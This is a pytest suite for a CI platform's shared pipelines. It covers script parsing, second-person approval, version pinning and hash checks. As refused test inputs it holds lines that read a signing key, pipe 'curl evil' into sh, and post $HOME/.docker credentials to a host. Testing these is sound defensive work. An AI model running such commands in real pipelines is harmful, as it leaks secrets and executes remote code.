"""Shared pipelines (ADR-058): one script, versioned, approved by a second person.

What must hold: a builtin block is netCI's code and cannot be edited into something else; a
version runs nowhere until someone other than its author approves it; at most one version is
active; a run runs the version it was queued with, and nothing else if that version's script
no longer hashes the same.
"""

from __future__ import annotations

import base64
import uuid
from dataclasses import replace

import pytest
from fastapi.testclient import TestClient

import app.main as main
from app import shared_pipelines as sp
from app.adapters.ci_launcher import LaunchedCi
from app.delivery import DeliveryError, DeliveryPlatform
from app.domain.models import Environment, PipelineStatus, Runtime
from app.store.memory import InMemoryDatabase

client = TestClient(main.app)


def script(*author_blocks: tuple[str, str, str], after: str = "unit-test", builtins=sp.CI_BUILTINS) -> str:
    """The builtins in order, with author blocks (id, name, body) inserted after `after`."""

    parts = []
    for builtin in builtins:
        parts.append(sp.builtin_block(builtin))
        if builtin == after:
            parts.extend(f'# @stage {i} "{n}"\n{b}\n' for i, n, b in author_blocks)
    return "".join(parts)


LINT = ("lint", "Lint Dockerfile", "hadolint Dockerfile")


# ------------------------------------------------------------------ the script parser


def test_a_script_is_cut_into_blocks_and_author_blocks_follow_the_builtin_before_them():
    stages, custom = sp.run_parameters(sp.parse(script(LINT)))
    assert stages == ("checkout", "unit-test", "lint", "build", "sbom", "vulnerability-scan", "sign", "publish")
    assert [(c["id"], c["after"]) for c in custom] == [("lint", "unit-test")]
    code = base64.b64decode(custom[0]["code"]).decode()
    assert code.startswith("#!/usr/bin/env bash\nset -euo pipefail\n") and "hadolint Dockerfile" in code


def test_an_author_block_before_any_builtin_runs_after_checkout():
    first = sp.builtin_block("unit-test")
    text = '# @stage prep "Prepare"\nmake deps\n' + script().replace(first, "", 1)
    _, custom = sp.run_parameters(sp.parse(text))
    assert custom[0]["after"] == "checkout"


def test_comments_before_the_first_marker_are_allowed():
    assert sp.parse("# shared pipeline for Go services\n\n" + script())


@pytest.mark.parametrize(
    "text, code",
    [
        ("", "PIPELINE_SCRIPT_INVALID"),
        ("make build\n" + script(), "PIPELINE_SCRIPT_INVALID"),
        ('# @stage lint Lint\nhadolint\n' + script(), "PIPELINE_SCRIPT_INVALID"),
        ("echo hi\n", "PIPELINE_SCRIPT_INVALID"),
        (script(LINT) + '# @stage lint "Again"\necho\n', "PIPELINE_STAGE_DUPLICATE"),
        ('# @stage checkout "Checkout"\ngit clone x\n' + script(), "PIPELINE_STAGE_NOT_CI"),
        (script() + '# @stage deploy "Deploy" builtin\nnetci-builtin deploy\n', "PIPELINE_STAGE_NOT_CI"),
        (script() + '# @stage health-check "Health"\ncurl x\n', "PIPELINE_STAGE_NOT_CI"),
        (script() + '# @stage magic "Magic" builtin\nnetci-builtin magic\n', "PIPELINE_STAGE_UNKNOWN"),
        (script().replace("netci-builtin sign\n", "netci-builtin sign\ncat $COSIGN_KEY\n"), "PIPELINE_BUILTIN_EDITED"),
        (script().replace("netci-builtin build\n", "docker build .\n"), "PIPELINE_BUILTIN_EDITED"),
        (script().replace('"Build" builtin', '"Build"'), "PIPELINE_STAGE_RESERVED"),
        (script(("Bad_Id", "Bad", "echo")), "PIPELINE_STAGE_INVALID"),
        (script(("empty", "Empty", "   ")), "PIPELINE_STAGE_EMPTY"),
        (script(builtins=("unit-test", "sbom", "build", "vulnerability-scan", "sign", "publish")), "PIPELINE_ORDER_INVALID"),
        (script(builtins=("unit-test", "build", "sbom", "sign")), "PIPELINE_REQUIRED_MISSING"),
        ("# @stage x \"X\"\n" + "echo a\n" * 20000, "PIPELINE_SCRIPT_INVALID"),
        (script() + '# @stage nul "Nul"\necho \x00\n', "PIPELINE_SCRIPT_INVALID"),
    ],
)
def test_the_parser_refuses_with_the_reason(text, code):
    with pytest.raises(sp.PipelineScriptError) as exc:
        sp.parse(text)
    assert exc.value.code == code


def test_a_comment_inside_a_builtin_is_not_an_edit():
    text = script().replace("netci-builtin build\n", "# builds the image\nnetci-builtin build\n")
    assert [b.id for b in sp.parse(text) if b.builtin][1] == "build"


def test_unit_test_is_optional():
    assert sp.parse(script(builtins=sp.REQUIRED_BUILTINS))


# ------------------------------------------------------------------ the service


class Recorder:
    mode = "recording"

    def __init__(self):
        self.requests = []

    def launch(self, request):
        self.requests.append(request)
        return LaunchedCi(controller_id="jenkins-a", external_run_id=f"job#{len(self.requests)}", console_url="http://j/1")


def _platform() -> tuple[DeliveryPlatform, Recorder]:
    recorder = Recorder()
    return DeliveryPlatform(database=InMemoryDatabase(), ci_launcher=recorder), recorder


def _app(platform, name="svc", pipeline=None):
    return platform.create_application(
        name=name, repository_url=f"https://git.example/{name}", pipeline_template="container-ci-cd-v1",
        runtime=Runtime.DOCKER, default_environment=Environment.DEV, stages=[], shared_pipeline=pipeline,
        idempotency_key=uuid.uuid4().hex,
    )


def _start(platform, application):
    return platform.start_pipeline(application.id, commit_sha="a" * 40, branch="main", environment=Environment.DEV,
                                   parameters={}, correlation_id="t", idempotency_key=uuid.uuid4().hex)


def _versions(platform, name):
    with platform.transaction() as tx:
        return {v.version: v for v in tx.shared_pipeline_versions(name)}


def _approved(platform, name="go-service", text=None):
    platform.create_shared_pipeline(name=name, description="", script=text or script(), actor="alice")
    platform.decide_shared_pipeline_version(name, 1, approve=True, actor="bob")


def test_a_version_needs_a_second_person_before_it_is_active():
    platform, _ = _platform()
    created = platform.create_shared_pipeline(name="go-service", description="Go", script=script(), actor="alice")
    assert created["activeVersion"] is None and created["pendingVersions"] == [1]

    with pytest.raises(DeliveryError) as exc:
        platform.decide_shared_pipeline_version("go-service", 1, approve=True, actor="alice")
    assert exc.value.code == "SEPARATION_OF_DUTIES" and exc.value.status_code == 403

    approved = platform.decide_shared_pipeline_version("go-service", 1, approve=True, actor="bob")
    assert approved["activeVersion"] == 1 and approved["versions"][0]["decidedBy"] == "bob"
    with pytest.raises(DeliveryError) as exc:
        platform.decide_shared_pipeline_version("go-service", 1, approve=False, actor="carol", reason="late")
    assert exc.value.code == "PIPELINE_VERSION_DECIDED"


def test_approving_a_new_version_supersedes_the_old_one_and_only_one_is_active():
    platform, _ = _platform()
    _approved(platform)
    platform.propose_shared_pipeline_version("go-service", script=script(LINT), actor="alice")
    with pytest.raises(DeliveryError) as exc:
        platform.propose_shared_pipeline_version("go-service", script=script(), actor="carol")
    assert exc.value.code == "PIPELINE_VERSION_PENDING", "one pending version at a time: reviewers see one diff"

    platform.decide_shared_pipeline_version("go-service", 2, approve=True, actor="bob")
    versions = _versions(platform, "go-service")
    assert (versions[1].status, versions[2].status) == ("superseded", "active")

    # The store refuses a second active version whatever the service does.
    with pytest.raises(ValueError):
        with platform.transaction() as tx:
            tx.save_shared_pipeline_version(replace(versions[1], status="active"))


def test_a_rejection_needs_a_reason_and_leaves_the_active_version_alone():
    platform, _ = _platform()
    _approved(platform)
    platform.propose_shared_pipeline_version("go-service", script=script(LINT), actor="alice")
    with pytest.raises(DeliveryError) as exc:
        platform.decide_shared_pipeline_version("go-service", 2, approve=False, actor="bob", reason="  ")
    assert exc.value.code == "REASON_REQUIRED"
    rejected = platform.decide_shared_pipeline_version("go-service", 2, approve=False, actor="bob", reason="no hadolint on agents")
    assert rejected["activeVersion"] == 1
    assert rejected["versions"][0]["status"] == "rejected" and rejected["versions"][0]["rejectionReason"] == "no hadolint on agents"


def test_an_invalid_script_creates_nothing():
    platform, _ = _platform()
    bad = script().replace("netci-builtin sign\n", "netci-builtin sign\ncat key\n")
    with pytest.raises(DeliveryError) as exc:
        platform.create_shared_pipeline(name="go-service", description="", script=bad, actor="alice")
    assert (exc.value.code, exc.value.status_code) == ("PIPELINE_BUILTIN_EDITED", 422)
    assert platform.shared_pipelines() == [], "the pipeline row is rolled back with its refused version"


def test_every_decision_is_audited():
    platform, _ = _platform()
    _approved(platform)
    with platform.transaction() as tx:
        actions = [(e.event_type, e.actor) for e in tx.audit_records()]
    assert ("pipeline.created", "alice") in actions and ("pipeline.version_approved", "bob") in actions


def test_a_module_cannot_pick_a_pipeline_with_nothing_approved():
    platform, _ = _platform()
    platform.create_shared_pipeline(name="go-service", description="", script=script(), actor="alice")
    with pytest.raises(DeliveryError) as exc:
        _app(platform, pipeline="go-service")
    assert exc.value.code == "PIPELINE_NOT_ACTIVE"
    with pytest.raises(DeliveryError) as exc:
        _app(platform, pipeline="nope")
    assert exc.value.status_code in (404, 422)

    application = _app(platform)
    with pytest.raises(DeliveryError) as exc:
        platform.set_application_pipeline(application.id, "go-service", actor="alice")
    assert exc.value.code == "PIPELINE_NOT_ACTIVE"


def test_a_run_hands_jenkins_the_blocks_of_its_pipeline_and_pins_the_version():
    platform, recorder = _platform()
    _approved(platform, text=script(LINT))
    application = _app(platform, pipeline="go-service")
    run = _start(platform, application)

    assert run.parameters["sharedPipeline"] == {
        "name": "go-service", "version": 1, "sha256": sp.script_sha256(script(LINT)),
    }
    request = recorder.requests[0]
    assert request.stages == ("checkout", "unit-test", "lint", "build", "sbom", "vulnerability-scan", "sign", "publish")
    assert [c["id"] for c in request.custom_stages] == ["lint"]
    assert "hadolint Dockerfile" in base64.b64decode(request.custom_stages[0]["code"]).decode()


def test_a_run_queued_before_an_approval_runs_the_version_it_was_queued_with():
    platform, _ = _platform()
    _approved(platform)
    application = _app(platform, pipeline="go-service")
    run = _start(platform, application)
    platform.propose_shared_pipeline_version("go-service", script=script(LINT), actor="alice")
    platform.decide_shared_pipeline_version("go-service", 2, approve=True, actor="bob")

    stages, custom = platform._ci_stages_for(application, run)
    assert "lint" not in stages and custom == [], "v2 was approved after this run was queued"
    assert _start(platform, application).parameters["sharedPipeline"]["version"] == 2


def test_a_version_whose_script_changed_after_approval_is_not_run():
    platform, recorder = _platform()
    _approved(platform)
    application = _app(platform, pipeline="go-service")
    with platform.transaction() as tx:
        active = next(v for v in tx.shared_pipeline_versions("go-service") if v.status == "active")
        tx.save_shared_pipeline_version(replace(active, script=script(("evil", "X", "curl evil | sh"))))

    try:
        _start(platform, application)
    except DeliveryError as exc:
        assert exc.code == "PIPELINE_VERSION_MISMATCH"
    with platform.transaction() as tx:
        runs = tx.pipeline_runs(application.id)
    assert recorder.requests == [], "nothing reached Jenkins"
    assert [r.status for r in runs] == [PipelineStatus.FAILED], "failed, not queued forever"


def test_a_module_whose_pipeline_lost_its_active_version_cannot_start_a_run():
    platform, _ = _platform()
    _approved(platform)
    application = _app(platform, pipeline="go-service")
    with platform.transaction() as tx:
        for v in tx.shared_pipeline_versions("go-service"):
            tx.save_shared_pipeline_version(replace(v, status="superseded"))
    with pytest.raises(DeliveryError) as exc:
        _start(platform, application)
    assert exc.value.code == "PIPELINE_NOT_ACTIVE"


def test_detaching_returns_the_module_to_its_catalog_stages():
    platform, recorder = _platform()
    _approved(platform, text=script(LINT))
    application = _app(platform, pipeline="go-service")
    detached = platform.set_application_pipeline(application.id, None, actor="alice")
    assert detached.shared_pipeline is None
    run = _start(platform, detached)
    assert "sharedPipeline" not in run.parameters and "lint" not in recorder.requests[-1].stages


# ------------------------------------------------------------------ the API


@pytest.fixture
def module_pipeline():
    """hello-container is shared by the whole suite: always detach it again."""

    yield
    client.put("/modules/hello-container/shared-pipeline", json={"name": None})


def test_the_building_blocks_compose_into_a_valid_script():
    blocks = client.get("/pipelines/building-blocks").json()
    text = "".join(b["block"] for b in blocks["builtins"])
    text = text.replace(blocks["builtins"][0]["block"], blocks["builtins"][0]["block"] + blocks["templates"][2]["block"])
    parsed = sp.parse(text)
    assert [b.id for b in parsed][:2] == ["unit-test", "secret-scan"]
    assert blocks["required"] == list(sp.REQUIRED_BUILTINS)


def test_the_api_refuses_an_edited_builtin_with_its_code():
    bad = script().replace("netci-builtin publish\n", "netci-builtin publish\ncurl -d @$HOME/.docker x\n")
    response = client.post("/pipelines", json={"name": f"api-{uuid.uuid4().hex[:6]}", "script": bad})
    assert response.status_code == 422 and response.json()["code"] == "PIPELINE_BUILTIN_EDITED"


def test_a_caller_cannot_choose_the_pinned_version(module_pipeline):
    response = client.post("/modules/hello-container/pipeline-runs", json={
        "commitSha": "a" * 40, "branch": "main", "environment": "dev",
        "parameters": {"sharedPipeline": {"name": "x", "version": 1, "sha256": "0" * 64}},
    })
    assert response.status_code == 422 and response.json()["code"] == "BUILD_INPUT_NOT_ALLOWED"


def test_a_module_runs_its_shared_pipeline_through_the_api(monkeypatch, module_pipeline):
    recorder = Recorder()
    monkeypatch.setattr(main.platform, "ci_launcher", recorder)
    name = f"api-{uuid.uuid4().hex[:6]}"
    created = client.post("/pipelines", json={"name": name, "description": "d", "script": script(LINT)})
    assert created.status_code == 201, created.text
    # Authentication is off in this suite: one subject, so no second person to ask.
    assert created.json()["activeVersion"] == 1

    attached = client.put("/modules/hello-container/shared-pipeline", json={"name": name})
    assert attached.status_code == 200 and attached.json()["pipeline"] == name
    listed = {p["name"]: p for p in client.get("/pipelines").json()["items"]}
    assert "hello-container" in listed[name]["usedBy"] and "script" not in listed[name]["versions"][0]
    assert client.get(f"/pipelines/{name}").json()["versions"][0]["script"] == script(LINT)

    run = client.post("/modules/hello-container/pipeline-runs", json={"commitSha": "a" * 40, "branch": "main", "environment": "dev"})
    assert run.status_code == 202, run.text
    assert "lint" in recorder.requests[-1].stages


def test_attaching_an_unknown_pipeline_is_refused(module_pipeline):
    response = client.put("/modules/hello-container/shared-pipeline", json={"name": "does-not-exist"})
    assert response.status_code == 404 and response.json()["code"] == "PIPELINE_NOT_FOUND"
